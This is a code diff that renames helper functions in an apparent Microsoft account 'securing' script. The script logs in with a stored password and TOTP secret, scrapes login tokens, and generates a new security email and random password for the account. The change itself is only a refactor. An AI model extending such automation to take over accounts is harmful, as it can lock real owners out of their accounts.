@@ -1,10 +1,10 @@
-from securing.utils.generate_email import generateEmail
-from securing.build_embeds import buildAccountData
-from securing.utils.get_livedata import getLiveData
-from auth.handle_redirects import handleRedirects
-from securing.utils.polish_host import polishHost
-from securing.utils.login_pwd import loginPWD
-from auth.initial_session import getSession
+from securing.utils.generate_email import generate_email
+from securing.build_embeds import build_account_data
+from securing.utils.get_livedata import livedata
+from auth.handle_redirects import handle_redirects
+from securing.utils.polish_host import polish_host
+from securing.utils.login_pwd import login_pwd
+from auth.initial_session import get_session
 from securing.utils.secure import secure
 from shared.gen_totp import totp
 
@@ -21,8 +21,8 @@ async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict
     secret = data["auth_secret"]
     password = data["password"]
 
-    live_data = await getLiveData(session)
-    pwd_login = await loginPWD(
+    live_data = await livedata(session)
+    pwd_login = await login_pwd(
         session,
         email,
         live_data["urlPost"],
@@ -71,23 +71,23 @@ async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict
     urlPost = re.search(r'"urlPost":"([^"]+)"', auth_post.text)
     logging.debug(f"Extracted urlPost: {urlPost.group(1) if urlPost else 'None'}")
     if not urlPost:
-        msaauth = await handleRedirects(session, auth_post.text)
+        msaauth = await handle_redirects(session, auth_post.text)
         if not msaauth:
             return None
     ppft = re.search(r'"sFT":"([^"]+)"', auth_post.text).group(1)
 
-    await polishHost(session, {"urlPost": urlPost.group(1), "ppft": ppft})
+    await polish_host(session, {"urlPost": urlPost.group(1), "ppft": ppft})
 
     dsecured = await secure(session, True, account)
     logging.info(f"Account: {dsecured}")
     final_time = (time() - initialTime)
 
-    build_account = await buildAccountData(dsecured, final_time)
+    build_account = await build_account_data(dsecured, final_time)
     return build_account
             
 async def recoverySecure(email: str, type: str, data: dict) -> dict:
 
-    session = getSession()
+    session = get_session()
 
     account = {
         "microsoft": {
@@ -115,7 +115,7 @@ async def recoverySecure(email: str, type: str, data: dict) -> dict:
     sname = uuid.uuid4().hex[:16]
     password = uuid.uuid4().hex[:12]
 
-    security_email = (await generateEmail(sname, password))[1]
+    security_email = (await generate_email(sname, password))[1]
     print(f"[+] - Generated Security Email ({security_email})")
 
     with DBConnection() as database:
